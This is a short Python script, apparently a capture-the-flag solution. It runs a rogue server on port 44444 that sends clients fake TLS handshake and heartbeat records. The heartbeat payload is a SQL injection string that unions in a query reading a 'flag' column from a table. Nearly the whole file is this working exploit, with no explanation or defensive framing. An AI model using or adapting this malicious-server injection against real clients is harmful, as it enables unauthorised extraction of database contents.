import struct
import socket
import datetime
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', 44444))
sock.listen(1024)
try:
    while True:
        conn, addr = sock.accept()
        try:
            conn.settimeout(1)
            data = conn.recv(128)
            package = ''
            package += '\x16\x01\x01\x00\x01'
            conn.send(package + '\x0e')
            data = conn.recv(256) # heartbeat
            payload = '\' union all SELECT flag from ssFLGss WHERE \'x\'!=\''
            package = '\x18\x01\x01' + struct.pack('>H', len(payload))
            conn.send(package + payload)
        except:
            pass
        finally:
            conn.close()
except:
    pass
finally:
    sock.close()
